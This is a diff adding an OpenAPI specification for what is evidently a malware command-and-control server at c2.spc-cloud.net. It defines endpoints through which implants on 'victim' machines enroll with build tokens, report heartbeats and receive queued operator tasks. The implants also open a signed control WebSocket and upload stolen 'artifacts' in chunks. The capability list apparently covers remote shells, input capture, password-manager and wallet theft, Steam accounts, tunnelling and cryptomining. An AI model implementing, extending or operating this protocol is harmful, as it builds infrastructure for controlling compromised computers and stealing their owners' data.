@@ -1,0 +1,336 @@
+openapi: 3.1.0
+info:
+  title: SPC Wire Contract
+  version: "2"
+  description: Additive v2. See CONTRACT.md; v1 paths and semantics are unchanged.
+servers:
+  - url: https://c2.spc-cloud.net/api/v1
+components:
+  securitySchemes:
+    VictimHmac:
+      type: apiKey
+      in: header
+      name: X-Signature
+  schemas:
+    Error:
+      type: object
+      required: [error, message]
+      properties:
+        error: {type: string}
+        message: {type: string}
+        retry_after: {type: integer, minimum: 0}
+        victim_ids: {type: array, items: {type: string, format: uuid}}
+    EnrollRequest:
+      type: object
+      required: [build_token, build_id, hostname, os, arch, username, agent_version, profile]
+      properties:
+        build_token: {type: string, maxLength: 64}
+        build_id: {type: string, format: uuid}
+        hostname: {type: string, maxLength: 128}
+        os: {type: string, enum: [windows, linux, macos]}
+        os_version: {type: string, maxLength: 128}
+        arch: {type: string, enum: [x86_64, aarch64]}
+        username: {type: string, maxLength: 128}
+        agent_version: {type: string, maxLength: 32}
+        profile: {type: string, enum: [lite, full]}
+        modules: {type: array, items: {type: string}}
+        capabilities: {type: array, items: {type: string, enum: [pty, input, media, tunnel, cloud, pm, steam, wc, triggers, miner]}}
+        device_token: {type: string, description: 'v2 proof of possession. Omitted by 0.3.7.'}
+        key_epoch: {type: integer, minimum: 1}
+    EnrollResponse:
+      type: object
+      required: [victim_id, device_token, server_time, heartbeat_interval, poll_interval, config_version]
+      properties:
+        victim_id: {type: string, format: uuid}
+        device_token: {type: string}
+        server_time: {type: integer}
+        heartbeat_interval: {type: integer}
+        poll_interval: {type: integer}
+        config_version: {type: integer}
+        contract: {type: integer, const: 2}
+        capabilities: {type: array, items: {type: string}}
+        identity_state: {type: string, enum: [confirmed, unverified, grace, revoked]}
+        key_epoch: {type: integer, minimum: 1}
+        key_salt: {type: string, description: 'Only on enroll or when the epoch moved.'}
+    Heartbeat:
+      type: object
+      required: [status, uptime_s, modules, counters, profile]
+      properties:
+        status: {type: string, enum: [ok, degraded]}
+        uptime_s: {type: integer}
+        modules: {type: object, additionalProperties: {type: string}}
+        counters: {type: object, additionalProperties: {type: integer}}
+        profile: {type: string, enum: [lite, full]}
+        pending_artifact: {type: [string, "null"]}
+        agent_version: {type: string}
+        key_epoch: {type: integer, minimum: 1}
+        capabilities: {type: array, items: {type: string}}
+    Capabilities:
+      type: object
+      required: [contract, supported, capabilities, key_epoch]
+      properties:
+        contract: {type: integer, const: 2}
+        supported: {type: array, items: {type: string}}
+        capabilities: {type: array, items: {type: string}, description: 'Persisted intersection.'}
+        key_epoch: {type: integer, minimum: 1}
+    Task:
+      type: object
+      required: [id, name, params, timeout_sec]
+      properties:
+        id: {type: string, format: uuid}
+        name: {type: string}
+        params: {type: object}
+        timeout_sec: {type: integer, minimum: 1, maximum: 3600}
+        not_before: {type: integer, description: 'Epoch seconds. A future value stays queued.'}
+    TaskResult:
+      type: object
+      required: [status, result]
+      description: >
+        Consumers read `status` first. On `error:"timeout"` the result is `{}` and
+        artifacts is `[]`; on `unknown` the panel gave up waiting and the task is
+        terminal. A duplicate final body returns 409 already_finished.
+      properties:
+        status: {type: string, enum: [ok, error, cancelled]}
+        error: {type: [string, "null"]}
+        result: {type: object}
+        artifacts: {type: array, items: {type: object}}
+    UploadInit:
+      type: object
+      required: [container_version, total_size, chunk_count, sha256, module]
+      properties:
+        task_id: {type: [string, "null"]}
+        module: {type: string}
+        container_version: {type: integer, const: 1}
+        total_size: {type: integer, maximum: 536870912}
+        chunk_count: {type: integer, minimum: 1}
+        sha256: {type: string, pattern: '^[0-9a-f]{64}$'}
+    WsTicketResponse:
+      type: object
+      required: [ticket, expires_in, handshake_nonce, device_id]
+      description: Single-use ticket for the control WebSocket. See ws.md §2.
+      properties:
+        ticket: {type: string, pattern: '^[A-Za-z0-9_-]{43}$'}
+        expires_in: {type: integer, const: 30}
+        handshake_nonce: {type: string, pattern: '^[A-Za-z0-9_-]{22}$'}
+        device_id: {type: string, format: uuid}
+    WsCloseCode:
+      type: integer
+      enum: [1000, 4400, 4401, 4403, 4408, 4409, 4429, 4500]
+      description: Control-channel close codes. See ws.md §7.1.
+    WsFrame:
+      type: object
+      description: One signed UTF-8 control frame. Type fields are top-level; the full schema is contract/v1/ws-schemas.json.
+      required: [v, id, seq, ts, type, nonce, data, sig]
+      properties:
+        v: {type: integer, const: 2}
+        id: {type: string, format: uuid}
+        seq: {type: integer, minimum: 1, maximum: 9007199254740991}
+        ts: {type: integer, description: Unix seconds}
+        type: {type: string, enum: [hello, hello_ok, cmd, result, event, ack, ping, pong, bye]}
+        nonce: {type: string, pattern: '^[A-Za-z0-9_-]{22}$'}
+        reply_to: {type: string, format: uuid}
+        name: {type: string}
+        args: {type: object}
+        task_id: {type: string, format: uuid}
+        timeout_ms: {type: integer, minimum: 1, maximum: 300000, default: 30000}
+        body:
+          type: object
+          description: Literal CryptoModule result body.
+          required: [status, result]
+          properties:
+            status: {type: string, enum: [ok, error, cancelled]}
+            error: {type: [string, "null"]}
+            result: {type: object}
+            artifacts: {type: array, items: {type: object}}
+        kind: {type: string}
+        data: {type: object}
+        legacy: {type: string}
+        hostname: {type: string}
+        user: {type: string}
+        os: {type: string}
+        agent: {type: string}
+        public_ip: {type: string}
+        path: {type: string}
+        first: {type: boolean}
+        expect_seq_in: {type: integer, minimum: 0}
+        expect_seq_out: {type: integer, minimum: 0}
+        server_time: {type: integer}
+        code: {type: integer}
+        reason: {type: string}
+        sig: {type: string, pattern: '^[A-Za-z0-9_-]{43}$'}
+paths:
+  /enroll:
+    post:
+      summary: Enroll a build instance
+      requestBody:
+        required: true
+        content: {application/json: {schema: {$ref: '#/components/schemas/EnrollRequest'}}}
+      responses:
+        "201": {description: Enrolled, content: {application/json: {schema: {$ref: '#/components/schemas/EnrollResponse'}}}}
+        "403": {description: build_revoked, content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}}
+        "409": {description: duplicate_or_conflict, content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}}
+        "401": {description: bad_device_token, content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}}
+  /capabilities:
+    get:
+      security: [{VictimHmac: []}]
+      summary: Refresh the negotiated contract and capability intersection
+      responses:
+        "200": {description: OK, content: {application/json: {schema: {$ref: '#/components/schemas/Capabilities'}}}}
+        "401": {description: bad_signature}
+  /hb:
+    post:
+      security: [{VictimHmac: []}]
+      requestBody:
+        required: true
+        content: {application/json: {schema: {$ref: '#/components/schemas/Heartbeat'}}}
+      responses:
+        "200": {description: OK}
+        "401": {description: bad_signature}
+        "410": {description: revoked}
+  /tasks:
+    post:
+      description: >
+        Console enqueue. A due task needs a live control socket: without one the
+        answer is `409 agent_offline` with `victim_ids`, no queue. A future
+        `not_before` is scheduled instead; at 32 queued per device the answer is
+        `409 queue_full`. Out-of-range params are `422 invalid_params` with the
+        range in the message.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [victim_ids, name]
+              properties:
+                victim_ids: {type: array, items: {type: string, format: uuid}}
+                name: {type: string}
+                params: {type: object}
+                priority: {type: integer}
+                timeout_sec: {type: integer}
+                not_before: {type: string, format: date-time}
+      responses:
+        "201":
+          description: Created and dispatched, or scheduled
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  items: {type: array, items: {type: object, properties: {id: {type: string, format: uuid}, victimId: {type: string, format: uuid}}}}
+        "409":
+          description: agent_offline (no control socket) or queue_full (32 scheduled)
+          content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}
+        "422": {description: invalid_params or no_victims}
+        "501": {description: capability_not_implemented, content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}}
+    get:
+      security: [{VictimHmac: []}]
+      description: >
+        Leases queued work. Scheduled tasks (`not_before`) are handed out FIFO,
+        four at a time, chaining one more per result; the queue is capped at 32
+        per device and a task more than 1 h past its slot is `expired` instead of
+        leased. `unknown` is terminal and is never returned.
+      parameters:
+        - {name: limit, in: query, schema: {type: integer, minimum: 1, maximum: 32}}
+      responses:
+        "200":
+          description: Leased tasks
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  tasks: {type: array, items: {$ref: '#/components/schemas/Task'}}
+  /tasks/{id}/result:
+    post:
+      security: [{VictimHmac: []}]
+      parameters: [{name: id, in: path, required: true, schema: {type: string, format: uuid}}]
+      requestBody:
+        required: true
+        content: {application/json: {schema: {$ref: '#/components/schemas/TaskResult'}}}
+      responses:
+        "200": {description: Recorded}
+        "409": {description: already_finished}
+        "422": {description: unknown_task}
+  /artifacts:
+    post:
+      security: [{VictimHmac: []}]
+      requestBody:
+        required: true
+        content: {application/json: {schema: {$ref: '#/components/schemas/UploadInit'}}}
+      responses:
+        "201": {description: Upload open}
+        "413": {description: payload_too_large}
+  /artifacts/{upload_id}:
+    get:
+      security: [{VictimHmac: []}]
+      parameters: [{name: upload_id, in: path, required: true, schema: {type: string, format: uuid}}]
+      responses:
+        "200": {description: Offset and state}
+        "410": {description: upload_expired}
+  /artifacts/{upload_id}/chunk:
+    post:
+      security: [{VictimHmac: []}]
+      parameters:
+        - {name: upload_id, in: path, required: true, schema: {type: string, format: uuid}}
+        - {name: offset, in: query, required: true, schema: {type: integer, minimum: 0}}
+      requestBody:
+        required: true
+        content: {application/octet-stream: {schema: {type: string, format: binary}}}
+      responses:
+        "200": {description: Stored or already present}
+        "409": {description: offset_mismatch}
+  /artifacts/{upload_id}/commit:
+    post:
+      security: [{VictimHmac: []}]
+      parameters: [{name: upload_id, in: path, required: true, schema: {type: string, format: uuid}}]
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              type: object
+              required: [sha256, chunk_count]
+              properties:
+                sha256: {type: string, pattern: '^[0-9a-f]{64}$'}
+                chunk_count: {type: integer}
+      responses:
+        "200": {description: Queued for processing}
+        "409": {description: hash_or_offset_mismatch}
+  /ws-ticket:
+    post:
+      summary: Issue a single-use control WebSocket ticket
+      description: >
+        Signed with the normal VictimHmac scheme over an empty body. The ticket is
+        single-use, expires in 30 s, is bound to the authenticated device and is
+        exempt from the global 600/min limit (12/min per device). See ws.md §2.
+      security: [{VictimHmac: []}]
+      responses:
+        "201":
+          description: Ticket issued
+          content: {application/json: {schema: {$ref: '#/components/schemas/WsTicketResponse'}}}
+        "401": {description: bad_signature, clock_skew or replay, content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}}
+        "403": {description: revoked, content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}}
+        "429": {description: rate_limited, content: {application/json: {schema: {$ref: '#/components/schemas/Error'}}}}
+  /ws:
+    get:
+      summary: Upgrade to the control WebSocket
+      description: >
+        WebSocket upgrade (RFC 6455). The ticket travels in the query and is consumed
+        during the upgrade; the panel then sends `hello_ok` or closes with 4401.
+        Frames are UTF-8 JSON following ws.md; artifacts stay on the HTTP endpoints.
+        The response body after 101 is not modelled by OpenAPI.
+      parameters:
+        - {name: ticket, in: query, required: true, schema: {type: string, pattern: '^[A-Za-z0-9_-]{43}$'}}
+        - {name: device_id, in: query, required: true, schema: {type: string, format: uuid}}
+        - {name: expect_seq_in, in: query, required: false, schema: {type: integer, minimum: 0, maximum: 9007199254740991, default: 0}}
+        - {name: Sec-WebSocket-Protocol, in: header, required: false, schema: {type: string, example: spc-ws.v1}}
+      responses:
+        "101":
+          description: >
+            Switching protocols. First server frame is a signed `hello_ok`; unusable,
+            expired, reused or foreign ticket closes with 4401, revoked devices with 4403,
+            a newer connection for the same device closes the old one with 4409.
+            `expect_seq_in` absent means 0.
+        "401": {description: Request is not a valid WebSocket upgrade}
+        "426": {description: Upgrade required; not a close code and does not trigger backoff}
